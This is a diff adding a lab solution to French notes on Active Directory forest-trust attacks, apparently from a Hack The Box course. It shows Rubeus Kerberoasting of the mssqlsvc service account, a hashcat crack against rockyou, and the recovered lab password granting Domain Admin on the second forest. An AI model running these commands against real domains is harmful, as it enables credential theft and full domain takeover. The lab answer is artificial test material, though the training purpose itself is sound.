@@ -30,6 +30,19 @@ Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samacc
 
 Puis crack offline (Hashcat). Cracké = contrôle total des **deux** domaines en abusant simplement de la direction d'authentification du trust bidirectionnel.
 
+### Résolution lab (MS01 — INLANEFREIGHT ⇄ FREIGHTLOGISTICS)
+```powershell
+# Sur MS01 (RDP htb-student)
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+#   → $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@...
+```
+```bash
+# Crack offline (box d'attaque)
+hashcat -m 13100 mssqlsvc.hash /usr/share/wordlists/rockyou.txt
+#   → ...dbbd58:1logistics   (cracké en ~5 s)
+```
+**Password `mssqlsvc` = `1logistics`** → ce compte est Domain Admin de `FREIGHTLOGISTICS.LOCAL` (full admin sur la 2e forêt).
+
 ## 2. Réutilisation de mot de passe & appartenance de groupe
 
 Sur un **forest trust bidirectionnel géré par les mêmes admins**, deux pistes classiques après avoir compromis la forêt A :
